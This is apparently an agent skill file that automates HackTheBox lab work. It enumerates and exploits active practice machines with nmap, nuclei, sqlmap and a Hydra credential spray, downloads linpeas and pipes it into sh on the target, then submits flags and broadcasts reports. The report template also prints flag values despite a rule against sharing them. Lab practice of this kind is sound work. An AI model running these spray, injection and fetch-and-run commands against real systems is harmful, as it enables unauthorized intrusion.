---
name: htb-pwn
description: |
  Full HackTheBox automation pipeline. Browses available active machines via the HTB v4 API,
  selects the best target (Easy/Medium, non-retired), spawns it over the HTB VPN, runs automated
  enumeration (nmap, httpx, nuclei, gobuster) and exploitation (sqlmap, linpeas, curl-based PoC),
  captures user.txt and root.txt proofs, submits flags to HTB, generates a structured pentest
  report, and broadcasts real-time alerts + the final report to Discord, Telegram, and WhatsApp.
  Zero manual steps after launch. Requires HTB_APP_TOKEN env var and HTB VPN active.
metadata:
  {
    "openclaw":
      {
        "emoji": "⚔️",
        "requires":
          {
            "bins": ["python3", "nmap", "nuclei", "gobuster", "httpx", "sqlmap", "curl"],
            "env": ["HTB_APP_TOKEN"],
          },
        "install":
          [
            {
              "id": "htb-tools-macos",
              "kind": "shell",
              "cmd": "brew install nmap gobuster httpx sqlmap nuclei && pip3 install requests rich",
              "bins": ["nmap", "gobuster", "httpx", "sqlmap", "nuclei"],
              "label": "Install HTB tools (macOS via brew + pip)",
              "when": "platform == 'darwin'",
            },
            {
              "id": "htb-tools-linux",
              "kind": "shell",
              "cmd": "sudo apt-get install -y nmap sqlmap gobuster 2>/dev/null || true && go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest && go install github.com/projectdiscovery/httpx/cmd/httpx@latest && pip3 install requests rich",
              "bins": ["nmap", "gobuster", "httpx", "sqlmap", "nuclei"],
              "label": "Install HTB tools (Linux via apt + Go + pip)",
              "when": "platform == 'linux'",
            },
          ],
      },
  }
---

# HTB Pwn — Zero-Touch HackTheBox Automation

Browse active machines → enumerate → exploit → report → broadcast to all channels.

> [!IMPORTANT]
> All activity is confined to the **HackTheBox VPN** (`10.10.x.x` ranges). Never test
> outside authorized HTB lab networks. Rate-limit all scans to avoid VPN disconnections.
> Requires `HTB_APP_TOKEN` env var set and VPN connected (`openvpn` or HTB Pwnbox).

---

## Pipeline Overview

```
┌─────────────────────────────────────────────────────────┐
│  PHASE 0  │  HTB API Auth (App Token)                   │
├─────────────────────────────────────────────────────────┤
│  PHASE 1  │  List Active Machines → Select Target       │
├─────────────────────────────────────────────────────────┤
│  PHASE 2  │  Spawn Machine + VPN Connectivity Check     │
├─────────────────────────────────────────────────────────┤
│  PHASE 3  │  Enumeration (nmap, httpx, nuclei, gobuster)│
├─────────────────────────────────────────────────────────┤
│  PHASE 4  │  Exploitation (service-aware, auto-select)  │
├─────────────────────────────────────────────────────────┤
│  PHASE 5  │  Proof Collection (user.txt / root.txt)     │
├─────────────────────────────────────────────────────────┤
│  PHASE 6  │  Report Generation (pentest format)         │
├─────────────────────────────────────────────────────────┤
│  PHASE 7  │  Broadcast — Discord, Telegram, WhatsApp    │
└─────────────────────────────────────────────────────────┘
```

---

## Usage from Agent

```
Run the HTB automation pipeline — pick the easiest active box and get me root
Automate the current HTB season challenge box and send the report to Discord
Hack the HTB machine named "MonitorsThree" and notify Telegram when done
Run HTB automation and post the full report to WhatsApp, Discord, and Telegram
```

---

## Phase 0 — HTB API Auth

Set your App Token in `.env` or `openclaw.json env block`:

```bash
HTB_APP_TOKEN=eyJ...   # from https://app.hackthebox.com/profile/settings → App Token
```

The script uses this for all HTB API calls. No password required.

---

## Phase 1 — Browse & Select Active Machines

### List Active (Non-Retired) Machines

```bash
# Via HTB v4 API
curl -s -H "Authorization: Bearer $HTB_APP_TOKEN" \
  "https://www.hackthebox.com/api/v4/machine/list/active" \
  | python3 -m json.tool | head -80
```

### Selection Criteria (priority order)

| Criterion  | Preference                                     |
| ---------- | ---------------------------------------------- |
| Difficulty | Easy → Medium → Hard (skip Insane by default)  |
| OS         | Linux preferred (more automated exploit paths) |
| Points     | Higher points = more learning coverage         |
| User own % | Lower % = less competition, fresher box        |
| Season     | Current active season machines first           |

### Auto-select command

```
python3 skills/htb-pwn/scripts/htb_auto.py --list
```

Output shows a ranked table of active machines with recommended target highlighted.

---

## Phase 2 — Spawn & VPN Check

```bash
# Spawn machine via API
curl -s -X POST \
  -H "Authorization: Bearer $HTB_APP_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"machine_id": <ID>}' \
  "https://www.hackthebox.com/api/v4/vm/spawn"

# Verify VPN connection and machine reachability
ping -c 3 10.10.XX.XX
```

---

## Phase 3 — Enumeration

All tools are rate-limited to avoid overloading the VPN gateway.

### 3a — Full Port Scan (nmap)

```bash
TARGET="10.10.XX.XX"
nmap -sV -sC -p- --min-rate 2000 -oA recon/nmap_full "$TARGET"
nmap -sV --script=vuln -p "$(grep '/tcp' recon/nmap_full.gnmap | grep open | cut -d/ -f1 | tr '\n' ',')" -oA recon/nmap_vuln "$TARGET"
```

### 3b — Web Enumeration (httpx + gobuster)

```bash
# Check if web service is up
httpx -u "http://$TARGET" -u "https://$TARGET" -title -status-code -tech-detect

# Directory/file brute-force
gobuster dir -u "http://$TARGET" \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  --delay 100ms -o recon/gobuster.txt
```

### 3c — CVE / Misconfiguration Scan (nuclei)

```bash
nuclei -u "http://$TARGET" \
  -severity critical,high,medium \
  -rate-limit 5 \
  -json -o findings/nuclei.json
```

---

## Phase 4 — Exploitation (Service-Aware)

The agent auto-selects an exploitation path based on Phase 3 findings:

| Service Found        | Auto-Action                                         |
| -------------------- | --------------------------------------------------- |
| HTTP login page      | Default creds, SQLi test, CVE search                |
| SSH (port 22)        | Hydra credential spray with rockyou.txt (top 1000)  |
| SMB (port 445)       | `smbmap`, `smbclient` anonymous + credential check  |
| FTP (port 21)        | Anonymous FTP login check + file listing            |
| SQL (3306/5432/1433) | sqlmap against any discovered web endpoints         |
| CMS detected (WP)    | `wpscan` enumeration + known vulnerable plugin CVEs |

### Example — SQL Injection via sqlmap

```bash
sqlmap -u "http://$TARGET/login" \
  --data="username=admin&password=test" \
  --batch --level=3 --risk=2 \
  --delay=1 --dbs \
  --json-output=findings/sqli.json
```

### Example — SMB Enumeration

```bash
smbmap -H "$TARGET" -u "" -p ""
smbclient -L "//$TARGET/" -N
```

### Privilege Escalation (post-shell)

After gaining initial shell:

```bash
# Download and run linpeas
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh 2>&1 | tee /tmp/linpeas.txt
```

---

## Phase 5 — Proof Collection

```bash
# Capture user flag
cat /home/*/user.txt  # or explore found paths
# Capture root flag
cat /root/root.txt

# Submit flags via HTB API
curl -s -X POST \
  -H "Authorization: Bearer $HTB_APP_TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"id\": <MACHINE_ID>, \"flag\": \"<FLAG_VALUE>\", \"difficulty\": 30}" \
  "https://www.hackthebox.com/api/v4/machine/own"
```

Evidence package saved to:

```
reports/<machine_name>_<date>/
  nmap_full.txt
  gobuster.txt
  nuclei.json
  exploitation_log.txt
  user_flag.txt
  root_flag.txt
  screenshot_user.png
  screenshot_root.png
  report.md
```

---

## Phase 6 — Report Generation

Report is auto-generated in pentest format using the `report-generator` skill structure:

```markdown
# HTB Machine: <Name> — <Date>

| Field          | Value                |
| -------------- | -------------------- |
| **Machine**    | <Name>               |
| **OS**         | Linux / Windows      |
| **IP**         | 10.10.XX.XX          |
| **Difficulty** | Easy / Medium / Hard |
| **Status**     | PWNED ✅             |
| **Flags**      | User ✅ / Root ✅    |

## Attack Path Summary

1. Discovered open ports: 22 (SSH), 80 (HTTP), 445 (SMB)
2. Found CMS version vulnerable to CVE-XXXX-XXXX
3. Exploited RCE → initial shell as www-data
4. Escalated via SUID binary → root

## Findings

### CRITICAL — Remote Code Execution (CVE-XXXX-XXXX)

...

## Flags

- **User:** `<flag>`
- **Root:** `<flag>`

## Remediation

...
```

---

## Phase 7 — Broadcast All Channels

### Real-Time Finding Alert (sent per flag captured)

```
⚔️ HTB BOX PWNED — <MachineName>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Machine:    <Name> (<Difficulty>)
OS:         Linux
IP:         10.10.XX.XX
Flags:      User ✅  Root ✅
Attack:     CVE-XXXX → RCE → SUID privesc
Duration:   2h 14m

Full report: reports/<machine>_<date>/report.md
```

### Discord (rich embed)

```json
{
  "action": "send",
  "channel": "discord",
  "to": "channel:<CHANNEL_ID>",
  "message": "⚔️ HTB Box Pwned!",
  "embeds": [
    {
      "title": "HTB: <MachineName> — PWNED ✅",
      "color": 5763719,
      "fields": [
        { "name": "Difficulty", "value": "Easy", "inline": true },
        { "name": "OS", "value": "Linux", "inline": true },
        { "name": "Flags", "value": "User ✅ Root ✅", "inline": true },
        { "name": "Attack Path", "value": "CVE-XXXX → RCE → SUID privesc" }
      ]
    }
  ]
}
```

### Telegram (Markdown)

```
Send Telegram message to @secteam:
*⚔️ HTB Machine Pwned!*
`Machine:` MonitorsThree (Easy · Linux)
`Flags:` User ✅ Root ✅
`Attack:` Apache CVE → RCE → SUID privesc
`Report:` reports/MonitorsThree_2026-02-23/report.md
```

### WhatsApp (via wacli)

```bash
wacli send text \
  --to "+1XXXXXXXXXX" \
  --message "⚔️ HTB Box Pwned! Machine: <Name> | Flags: User ✅ Root ✅ | Report ready."
```

---

## Config Reference

```json5
// In openclaw.json env block or .env
{
  env: {
    HTB_APP_TOKEN: "eyJ...", // Required — HTB App Token
    HTB_DISCORD_CHANNEL: "123456", // Discord channel ID to post reports
    HTB_TELEGRAM_CHAT: "@secteam", // Telegram username or chat_id
    HTB_WHATSAPP_TO: "+1XXXXXXXXXX", // WhatsApp number for wacli
  },
}
```

## Safety Rules

1. **VPN only** — Only scan `10.10.x.x` and `10.129.x.x` HTB ranges
2. **No DoS payloads** — Never use `--flood` or destructive scan options
3. **Flag within scope** — Only submit flags you legitimately captured
4. **No sharing flags** — Do not broadcast raw flag values publicly
5. **Rate limit** — All scans respect ≤ 5 RPS to protect the VPN gateway
